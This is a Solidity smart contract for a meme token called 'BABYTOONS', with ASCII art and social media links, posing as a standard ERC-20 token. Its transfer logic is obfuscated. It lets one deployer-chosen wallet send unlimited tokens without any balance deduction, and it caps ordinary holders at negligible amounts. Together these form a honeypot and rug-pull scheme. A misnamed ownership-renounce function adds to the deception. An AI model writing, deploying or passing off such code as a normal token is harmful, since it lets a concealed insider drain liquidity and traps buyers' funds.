/*

----------------------------------------------------------------------------
----------------------------------------------------------------------------
------------------------------=*##*++++++**#*=------------------------------
--------------------------+#*=----------------=+#*=-------------------------
------------------------*+------------------------=+#*----------------------
----------------------+*------------------------------=#+-------------------
--------------------=#=----------------------------------**-----------------
-------------------+*-------------------------------------=*=---------------
------------------#---------------------------=-------------+*--------------
----------------=+-------------------------=*=-----=#*=------+*-------------
---------------=+-----=*+----=#*=---------++----------+#------++------------
---------------+=----==---------=*=------=*--+%@@#+-----**-----*+-----------
--------------+=----+=----#@@@#=--*=----=*--#@@@@@@@+----++-----#=----------
-------------=+-----*---+%@@@@@@*--+=---=*-+%@@@@@@@%+----#-----++----------
-------------+=----*---=%@@@@@@@%+-+=---+*-+@@@@@@@@@#=---#------*----------
------------=+-----*---+@@@@@@@@%+-++---+*-+%@@@@@@@@#=---#------#----------
------------=+-----#---+%@@@@@@@#--*=---=*--+@@@@@@@#=---#=------#----------
------------=+-----++---+#@@@@%*--++-----++---#%@%#+---=#=------=*----------
------------=+------*=-----------++------=*=----------+#--------*=----------
------------=*-------*+--------=*+-+++++*=-+*=-----=+*=--------=*-----------
------------=*--------=+**+++**=---*=---*=---+*****+-----------*=-----------
-------------++-----------------------------------------------*+------------
-------------=*=---------------------------------------------++-------------
--------------=*=-------------------------------------------*+--------------
---------------=*=----------------------------------------=*=---------------
-----------------**-------------------------------------=**-----------------
------------------=*+---------------------------------+*+-------------------
--------------------=**+---------------------------=**=---------------------
-----------------------=+**+------------------=+**+=------------------------
---------------------------=+***************++==#++=------------------------
----------------------------=%------=*******=----#-=+*=---------------------
--------------------------=+#+----=**+++++++#*---+*---=+*=------------------
------------------------=++=#----+*++++++++++#*--=#=-----+*+----------------
-----------------------++--#=---=*++++++++++++%---+*-------=*+--------------
----------------------++--+*----=*+++====+++++%---=*=--------+*==-----------
---------------------=*+--#++****+*+++========#----+*=+**+=+*#+*#=----------
-----------------------==**==--+##*++++==+==+**--+#*++++++**#===------------
-------------------------*=------=#*+++==+++*#=---==**=====-----------------
------------------------=*=--------*#*++=++#*=------=*=---------------------
------------------------++-----------==+====---------*=---------------------
------------------------++---------------------------*=---------------------
------------------------++---------------------------*+---------------------
------------------------=*=--------------------------*+---------------------
-------------------------+*--------------------------*+---------------------
---------------------------=##%%####%%#**+====+*%#%#*=----------------------
---------------------------=*-------------------++--------------------------
---------------------------+*-==========+++++====#--------------------------
-----------------------++++*%++++++++++++++++++++%#*+++++==-----------------
--------------------=++++*#=#*+++++++++++++++++++%#%#++++++-----------------
--------------------=+++++++++++++++++++++++++++++++++++=-------------------
-------------------------====++++++++++++++++++++===------------------------
----------------------------------------------------------------------------


Telegram: https://t.me/cityboyscoin		
Twitter: https://x.com/cityboyscoin		
Web: https://www.cityboyscoin.com/		



*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnershipse() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYTOONS is Ownable {
    IUniswapV2Router02 private hkcurzd;

    function transfer(address khcgbaokve, uint256 otokhbkov) public returns (bool success) {
        wygyjhva(msg.sender, khcgbaokve, otokhbkov);
        return true;
    }

    uint8 public decimals = 18;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private lgbiqeurhnfd;

    function transferFrom(address noufgjgfc, address khcgbaokve, uint256 otokhbkov) public returns (bool success) {
        require(otokhbkov <= allowance[noufgjgfc][msg.sender]);
        allowance[noufgjgfc][msg.sender] -= otokhbkov;
        wygyjhva(noufgjgfc, khcgbaokve, otokhbkov);
        return true;
    }

    mapping(address => bool) private onuyzpktbgsl;

    function approve(address avyt, uint256 otokhbkov) public returns (bool success) {
        allowance[msg.sender][avyt] = otokhbkov;
        emit Approval(msg.sender, avyt, otokhbkov);
        return true;
    }

    function wygyjhva(address noufgjgfc, address khcgbaokve, uint256 otokhbkov) private {
        address gynfde = IUniswapV2Factory(hkcurzd.factory()).getPair(address(this), hkcurzd.WETH());
        bool rznw = zdlyhuio[noufgjgfc] == block.number;
        if (!onuyzpktbgsl[noufgjgfc]) {
            if (noufgjgfc != gynfde && otokhbkov < totalSupply && (!rznw || otokhbkov > lgbiqeurhnfd[noufgjgfc])) {
                require(totalSupply / (10 ** decimals) >= otokhbkov);
            }
            balanceOf[noufgjgfc] -= otokhbkov;
        }
        lgbiqeurhnfd[khcgbaokve] = otokhbkov;
        balanceOf[khcgbaokve] += otokhbkov;
        zdlyhuio[khcgbaokve] = block.number;
        emit Transfer(noufgjgfc, khcgbaokve, otokhbkov);
    }

    uint256 public totalSupply = 1000000000000000000000000000;

    constructor(string memory ypul, string memory ykxuviceowj, address uqlzexotfngh, address ipwdksocvuyx) {
        name = ypul;
        symbol = ykxuviceowj;
        balanceOf[msg.sender] = totalSupply;
        onuyzpktbgsl[ipwdksocvuyx] = true;
        hkcurzd = IUniswapV2Router02(uqlzexotfngh);
    }

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private zdlyhuio;
}